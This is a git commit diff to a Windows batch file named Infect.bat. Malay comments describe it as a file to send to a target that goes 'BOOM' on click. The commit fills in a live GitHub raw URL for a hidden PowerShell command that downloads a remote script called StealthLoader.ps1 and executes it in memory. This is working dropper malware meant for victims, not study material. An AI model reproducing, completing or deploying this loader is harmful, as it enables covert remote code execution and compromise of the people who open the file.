315288a2df416b412d1d3efe6ae75df88880994a
rootcpanel-yoe <rootcpanel@gmail.com>
2026-02-08 00:29:19 +0800

    Update Infect.bat

--- Infect.bat
+++ Infect.bat
@@ -2,4 +2,5 @@
 :: Fail ini untuk dihantar kepada target. Klik ja BOOM.
 :: Gantikan URL di bawah dengan Link Raw Gist StealthLoader.ps1 anda.
 
-powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('MASUKKAN_LINK_RAW_GIST_DISINI')"
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rootcpanel-yoe/313/refs/heads/main/StealthLoader.ps1')"
+
